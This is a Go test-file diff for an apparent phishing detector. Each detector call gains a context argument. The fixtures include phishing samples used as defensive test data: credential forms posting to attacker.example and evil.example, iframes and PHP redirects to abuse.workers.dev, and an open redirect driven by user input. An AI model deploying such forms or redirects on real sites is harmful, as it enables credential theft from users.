@@ -301,7 +301,7 @@ func TestQuickPhishingCheckPositive(t *testing.T) {
 	// Credential input + external form action = clear exfiltration shape.
 	content := `<html><body><form action="https://evil.example/collect"><input type="email" name="email"><input type="password" name="password"></form></body></html>`
 	_ = os.WriteFile(path, []byte(content), 0600)
-	if !quickPhishingCheck(path) {
+	if !quickPhishingCheck(context.Background(), path) {
 		t.Error("credential form posting external should match")
 	}
 }
@@ -310,13 +310,13 @@ func TestQuickPhishingCheckNoForm(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "about.html")
 	_ = os.WriteFile(path, []byte("<p>just some text with password word</p>"), 0600)
-	if quickPhishingCheck(path) {
+	if quickPhishingCheck(context.Background(), path) {
 		t.Error("text without form should not match")
 	}
 }
 
 func TestQuickPhishingCheckMissingFile(t *testing.T) {
-	if quickPhishingCheck(filepath.Join(t.TempDir(), "nope.html")) {
+	if quickPhishingCheck(context.Background(), filepath.Join(t.TempDir(), "nope.html")) {
 		t.Error("missing file should return false")
 	}
 }
@@ -325,7 +325,7 @@ func TestQuickPhishingCheckEmptyFile(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "empty.html")
 	_ = os.WriteFile(path, []byte(""), 0600)
-	if quickPhishingCheck(path) {
+	if quickPhishingCheck(context.Background(), path) {
 		t.Error("empty file should return false")
 	}
 }
@@ -341,7 +341,7 @@ carol@example.com,hunter2
 dan@example.com:password`
 	_ = os.WriteFile(path, []byte(content), 0600)
 
-	got := checkCredentialLog(path)
+	got := checkCredentialLog(context.Background(), path)
 	if !strings.Contains(got, "credential-like lines") {
 		t.Errorf("expected credential-like lines, got %q", got)
 	}
@@ -356,7 +356,7 @@ func TestCheckCredentialLogEmailDensity(t *testing.T) {
 	}
 	_ = os.WriteFile(path, []byte(strings.Join(lines, "\n")), 0600)
 
-	got := checkCredentialLog(path)
+	got := checkCredentialLog(context.Background(), path)
 	if !strings.Contains(got, "harvested email list") {
 		t.Errorf("expected harvested email list, got %q", got)
 	}
@@ -371,7 +371,7 @@ func TestCheckCredentialLogCSVSkipped(t *testing.T) {
 	}
 	_ = os.WriteFile(path, []byte(strings.Join(lines, "\n")), 0600)
 
-	got := checkCredentialLog(path)
+	got := checkCredentialLog(context.Background(), path)
 	if got != "" {
 		t.Errorf("csv files with only emails should not match, got %q", got)
 	}
@@ -381,13 +381,13 @@ func TestCheckCredentialLogNoMatch(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "log.txt")
 	_ = os.WriteFile(path, []byte("ordinary log line\nanother line\n"), 0600)
-	if got := checkCredentialLog(path); got != "" {
+	if got := checkCredentialLog(context.Background(), path); got != "" {
 		t.Errorf("ordinary log should not match, got %q", got)
 	}
 }
 
 func TestCheckCredentialLogMissingFile(t *testing.T) {
-	if got := checkCredentialLog(filepath.Join(t.TempDir(), "nope.txt")); got != "" {
+	if got := checkCredentialLog(context.Background(), filepath.Join(t.TempDir(), "nope.txt")); got != "" {
 		t.Errorf("missing file should return empty, got %q", got)
 	}
 }
@@ -400,7 +400,7 @@ func TestCheckIframePhishingFullscreenExternal(t *testing.T) {
 	content := `<html><body><iframe src="https://evil.example/phish" width="100%" height="100%"></iframe></body></html>`
 	_ = os.WriteFile(path, []byte(content), 0600)
 
-	got := checkIframePhishing(path)
+	got := checkIframePhishing(context.Background(), path)
 	if !strings.Contains(got, "Full-screen iframe") {
 		t.Errorf("expected full-screen iframe match, got %q", got)
 	}
@@ -412,7 +412,7 @@ func TestCheckIframePhishingExfilDomain(t *testing.T) {
 	content := `<html><body><iframe src="https://abuse.workers.dev/x" width="10" height="10"></iframe></body></html>`
 	_ = os.WriteFile(path, []byte(content), 0600)
 
-	got := checkIframePhishing(path)
+	got := checkIframePhishing(context.Background(), path)
 	if !strings.Contains(got, "suspicious external URL") {
 		t.Errorf("expected suspicious URL match, got %q", got)
 	}
@@ -422,7 +422,7 @@ func TestCheckIframePhishingNoIframe(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "ok.html")
 	_ = os.WriteFile(path, []byte("<html><body>no iframe</body></html>"), 0600)
-	if got := checkIframePhishing(path); got != "" {
+	if got := checkIframePhishing(context.Background(), path); got != "" {
 		t.Errorf("no iframe should return empty, got %q", got)
 	}
 }
@@ -432,13 +432,13 @@ func TestCheckIframePhishingRelativeSrc(t *testing.T) {
 	path := filepath.Join(dir, "rel.html")
 	content := `<iframe src="/local/page.html" width="100%"></iframe>`
 	_ = os.WriteFile(path, []byte(content), 0600)
-	if got := checkIframePhishing(path); got != "" {
+	if got := checkIframePhishing(context.Background(), path); got != "" {
 		t.Errorf("relative iframe should not match, got %q", got)
 	}
 }
 
 func TestCheckIframePhishingMissingFile(t *testing.T) {
-	if got := checkIframePhishing(filepath.Join(t.TempDir(), "nope.html")); got != "" {
+	if got := checkIframePhishing(context.Background(), filepath.Join(t.TempDir(), "nope.html")); got != "" {
 		t.Errorf("missing file should return empty, got %q", got)
 	}
 }
@@ -451,7 +451,7 @@ func TestCheckPHPRedirectorUserControlled(t *testing.T) {
 	content := `<?php header("Location: " . $_GET['url']); ?>`
 	_ = os.WriteFile(path, []byte(content), 0600)
 
-	got := checkPHPRedirector(path)
+	got := checkPHPRedirector(context.Background(), path)
 	if !strings.Contains(got, "user-supplied URL") {
 		t.Errorf("expected user-controlled match, got %q", got)
 	}
@@ -463,7 +463,7 @@ func TestCheckPHPRedirectorHardcodedExfil(t *testing.T) {
 	content := `<?php header("Location: https://abuse.workers.dev/steal"); ?>`
 	_ = os.WriteFile(path, []byte(content), 0600)
 
-	got := checkPHPRedirector(path)
+	got := checkPHPRedirector(context.Background(), path)
 	if !strings.Contains(got, "suspicious destination") {
 		t.Errorf("expected suspicious destination match, got %q", got)
 	}
@@ -473,7 +473,7 @@ func TestCheckPHPRedirectorNoHeader(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "ok.php")
 	_ = os.WriteFile(path, []byte("<?php echo 'hello'; ?>"), 0600)
-	if got := checkPHPRedirector(path); got != "" {
+	if got := checkPHPRedirector(context.Background(), path); got != "" {
 		t.Errorf("no header() should return empty, got %q", got)
 	}
 }
@@ -484,13 +484,13 @@ func TestCheckPHPRedirectorBenignHeader(t *testing.T) {
 	// header() to a hardcoded safe URL should not flag.
 	content := `<?php header("Location: /dashboard"); ?>`
 	_ = os.WriteFile(path, []byte(content), 0600)
-	if got := checkPHPRedirector(path); got != "" {
+	if got := checkPHPRedirector(context.Background(), path); got != "" {
 		t.Errorf("safe redirect should return empty, got %q", got)
 	}
 }
 
 func TestCheckPHPRedirectorMissingFile(t *testing.T) {
-	if got := checkPHPRedirector(filepath.Join(t.TempDir(), "nope.php")); got != "" {
+	if got := checkPHPRedirector(context.Background(), filepath.Join(t.TempDir(), "nope.php")); got != "" {
 		t.Errorf("missing file should return empty, got %q", got)
 	}
 }
@@ -523,7 +523,7 @@ func TestAnalyzeHTMLForPhishingDetectsBrandPhishing(t *testing.T) {
 	path := filepath.Join(dir, "verify.html")
 	_ = os.WriteFile(path, []byte(officePhishHTML), 0600)
 
-	res := analyzeHTMLForPhishing(path)
+	res := analyzeHTMLForPhishing(context.Background(), path)
 	if res == nil {
 		t.Fatal("expected phishing detection, got nil")
 	}
@@ -539,7 +539,7 @@ func TestAnalyzeHTMLForPhishingNoForm(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "about.html")
 	_ = os.WriteFile(path, []byte("<html><body>no form here</body></html>"), 0600)
-	if res := analyzeHTMLForPhishing(path); res != nil {
+	if res := analyzeHTMLForPhishing(context.Background(), path); res != nil {
 		t.Errorf("no form should return nil, got %+v", res)
 	}
 }
@@ -549,7 +549,7 @@ func TestAnalyzeHTMLForPhishingNoCredentialInput(t *testing.T) {
 	path := filepath.Join(dir, "search.html")
 	content := `<html><body><form><input type="text" name="query"></form></body></html>`
 	_ = os.WriteFile(path, []byte(content), 0600)
-	if res := analyzeHTMLForPhishing(path); res != nil {
+	if res := analyzeHTMLForPhishing(context.Background(), path); res != nil {
 		t.Errorf("non-credential form should return nil, got %+v", res)
 	}
 }
@@ -562,13 +562,13 @@ func TestAnalyzeHTMLForPhishingBenignLoginLowScore(t *testing.T) {
 <form action="/login"><input type="email" name="email"><input type="password" name="password"></form>
 </body></html>`
 	_ = os.WriteFile(path, []byte(content), 0600)
-	if res := analyzeHTMLForPhishing(path); res != nil {
+	if res := analyzeHTMLForPhishing(context.Background(), path); res != nil {
 		t.Errorf("benign login should return nil, got %+v", res)
 	}
 }
 
 func TestAnalyzeHTMLForPhishingMissingFile(t *testing.T) {
-	if res := analyzeHTMLForPhishing(filepath.Join(t.TempDir(), "nope.html")); res != nil {
+	if res := analyzeHTMLForPhishing(context.Background(), filepath.Join(t.TempDir(), "nope.html")); res != nil {
 		t.Errorf("missing file should return nil, got %+v", res)
 	}
 }
@@ -577,7 +577,7 @@ func TestAnalyzeHTMLForPhishingEmptyFile(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "empty.html")
 	_ = os.WriteFile(path, []byte(""), 0600)
-	if res := analyzeHTMLForPhishing(path); res != nil {
+	if res := analyzeHTMLForPhishing(context.Background(), path); res != nil {
 		t.Errorf("empty file should return nil, got %+v", res)
 	}
 }
@@ -610,7 +610,7 @@ func TestAnalyzePHPForPhishingDetectsDropbox(t *testing.T) {
 	path := filepath.Join(dir, "share.php")
 	_ = os.WriteFile(path, []byte(dropboxPhishPHP), 0600)
 
-	res := analyzePHPForPhishing(path)
+	res := analyzePHPForPhishing(context.Background(), path)
 	if res == nil {
 		t.Fatal("expected detection, got nil")
 	}
@@ -633,7 +633,7 @@ if ($_POST['email']) {
 <form><input type="email" name="email"><input name="message"></form>`
 	_ = os.WriteFile(path, []byte(content), 0600)
 
-	if res := analyzePHPForPhishing(path); res != nil {
+	if res := analyzePHPForPhishing(context.Background(), path); res != nil {
 		t.Errorf("contact form with no brand should return nil, got %+v", res)
 	}
 }
@@ -642,13 +642,13 @@ func TestAnalyzePHPForPhishingNoCredHandlingOrForm(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "about.php")
 	_ = os.WriteFile(path, []byte("<?php echo 'hello'; ?>"), 0600)
-	if res := analyzePHPForPhishing(path); res != nil {
+	if res := analyzePHPForPhishing(context.Background(), path); res != nil {
 		t.Errorf("plain php should return nil, got %+v", res)
 	}
 }
 
 func TestAnalyzePHPForPhishingMissingFile(t *testing.T) {
-	if res := analyzePHPForPhishing(filepath.Join(t.TempDir(), "nope.php")); res != nil {
+	if res := analyzePHPForPhishing(context.Background(), filepath.Join(t.TempDir(), "nope.php")); res != nil {
 		t.Errorf("missing file should return nil, got %+v", res)
 	}
 }
@@ -657,7 +657,7 @@ func TestAnalyzePHPForPhishingEmptyFile(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "empty.php")
 	_ = os.WriteFile(path, []byte(""), 0600)
-	if res := analyzePHPForPhishing(path); res != nil {
+	if res := analyzePHPForPhishing(context.Background(), path); res != nil {
 		t.Errorf("empty file should return nil, got %+v", res)
 	}
 }
@@ -673,7 +673,7 @@ func TestAnalyzeDirectoryStructurePhishingDrop(t *testing.T) {
 	content := `<html><body><form action="https://attacker.example/collect"><input type="email" name="email"><input type="password" name="password"></form></body></html>`
 	_ = os.WriteFile(filepath.Join(dropDir, "PalmerHamilton.html"), []byte(content), 0600)
 
-	res := analyzeDirectoryStructure(dropDir, "alice")
+	res := analyzeDirectoryStructure(context.Background(), dropDir, "alice")
 	if res == nil {
 		t.Fatal("expected phishing directory detection")
 	}
@@ -692,7 +692,7 @@ func TestAnalyzeDirectoryStructureTooManyHTML(t *testing.T) {
 	for _, n := range []string{"a.html", "b.html", "c.html", "d.html"} {
 		_ = os.WriteFile(filepath.Join(target, n), []byte("<html>"), 0600)
 	}
-	if res := analyzeDirectoryStructure(target, "alice"); res != nil {
+	if res := analyzeDirectoryStructure(context.Background(), target, "alice"); res != nil {
 		t.Errorf(">3 HTML files should not match, got %+v", res)
 	}
 }
@@ -702,7 +702,7 @@ func TestAnalyzeDirectoryStructureHasSubdirs(t *testing.T) {
 	target := filepath.Join(dir, "WashingtonGolf")
 	_ = os.MkdirAll(filepath.Join(target, "assets"), 0700)
 	_ = os.WriteFile(filepath.Join(target, "a.html"), []byte("<html>"), 0600)
-	if res := analyzeDirectoryStructure(target, "alice"); res != nil {
+	if res := analyzeDirectoryStructure(context.Background(), target, "alice"); res != nil {
 		t.Errorf("subdirs should disqualify, got %+v", res)
 	}
 }
@@ -712,7 +712,7 @@ func TestAnalyzeDirectoryStructureNonBusinessName(t *testing.T) {
 	target := filepath.Join(dir, "images") // standard dir
 	_ = os.MkdirAll(target, 0700)
 	_ = os.WriteFile(filepath.Join(target, "a.html"), []byte("<html>"), 0600)
-	if res := analyzeDirectoryStructure(target, "alice"); res != nil {
+	if res := analyzeDirectoryStructure(context.Background(), target, "alice"); res != nil {
 		t.Errorf("standard dir name should not match, got %+v", res)
 	}
 }
@@ -723,13 +723,13 @@ func TestAnalyzeDirectoryStructureNoPhishingContent(t *testing.T) {
 	_ = os.MkdirAll(target, 0700)
 	// HTML file without credential inputs.
 	_ = os.WriteFile(filepath.Join(target, "home.html"), []byte("<html><body>welcome</body></html>"), 0600)
-	if res := analyzeDirectoryStructure(target, "alice"); res != nil {
+	if res := analyzeDirectoryStructure(context.Background(), target, "alice"); res != nil {
 		t.Errorf("non-phishing content should not match, got %+v", res)
 	}
 }
 
 func TestAnalyzeDirectoryStructureMissingDir(t *testing.T) {
-	if res := analyzeDirectoryStructure(filepath.Join(t.TempDir(), "missing"), "alice"); res != nil {
+	if res := analyzeDirectoryStructure(context.Background(), filepath.Join(t.TempDir(), "missing"), "alice"); res != nil {
 		t.Errorf("missing dir should return nil, got %+v", res)
 	}
 }
@@ -901,7 +901,7 @@ ENTER PASSWORD <input type="password" name="pword">
 </form>
 </body></html>`
 	_ = os.WriteFile(path, []byte(content), 0600)
-	if quickPhishingCheck(path) {
+	if quickPhishingCheck(context.Background(), path) {
 		t.Error("tutorial login (no brand, no external action, no inline styling) must not match")
 	}
 }
@@ -911,7 +911,7 @@ func TestQuickPhishingCheckAcceptsExternalFormAction(t *testing.T) {
 	path := filepath.Join(dir, "verify.html")
 	content := `<html><body><form action="https://attacker.example/collect.php"><input type="email" name="email"><input type="password" name="password"></form></body></html>`
 	_ = os.WriteFile(path, []byte(content), 0600)
-	if !quickPhishingCheck(path) {
+	if !quickPhishingCheck(context.Background(), path) {
 		t.Error("credential form posting to external host must match")
 	}
 }
@@ -926,7 +926,7 @@ func TestQuickPhishingCheckAcceptsHTMLAttributeVariants(t *testing.T) {
 </form>
 </body></html>`
 	_ = os.WriteFile(path, []byte(content), 0600)
-	if !quickPhishingCheck(path) {
+	if !quickPhishingCheck(context.Background(), path) {
 		t.Error("credential form with spaced/unquoted attributes posting external must match")
 	}
 }
@@ -939,7 +939,7 @@ func TestQuickPhishingCheckAcceptsLaterExternalForm(t *testing.T) {
 <form action="https://attacker.example/collect"><input type="email" name="email"><input type="password" name="password"></form>
 </body></html>`
 	_ = os.WriteFile(path, []byte(content), 0600)
-	if !quickPhishingCheck(path) {
+	if !quickPhishingCheck(context.Background(), path) {
 		t.Error("credential page with later external form must match")
 	}
 }
@@ -949,7 +949,7 @@ func TestQuickPhishingCheckAcceptsBrandImpersonation(t *testing.T) {
 	path := filepath.Join(dir, "office.html")
 	content := `<html><head><title>Sign in to Office 365</title></head><body><form><input type="email" name="email"><input type="password" name="password"></form></body></html>`
 	_ = os.WriteFile(path, []byte(content), 0600)
-	if !quickPhishingCheck(path) {
+	if !quickPhishingCheck(context.Background(), path) {
 		t.Error("credential form on Office 365-titled page must match")
 	}
 }
@@ -959,7 +959,7 @@ func TestQuickPhishingCheckAcceptsSelfContainedKit(t *testing.T) {
 	path := filepath.Join(dir, "kit.html")
 	content := `<html><head><style>body{font-family:Arial}</style></head><body><form><input type="email" name="email"><input type="password" name="password"></form></body></html>`
 	_ = os.WriteFile(path, []byte(content), 0600)
-	if !quickPhishingCheck(path) {
+	if !quickPhishingCheck(context.Background(), path) {
 		t.Error("self-contained inline-styled credential page must match")
 	}
 }
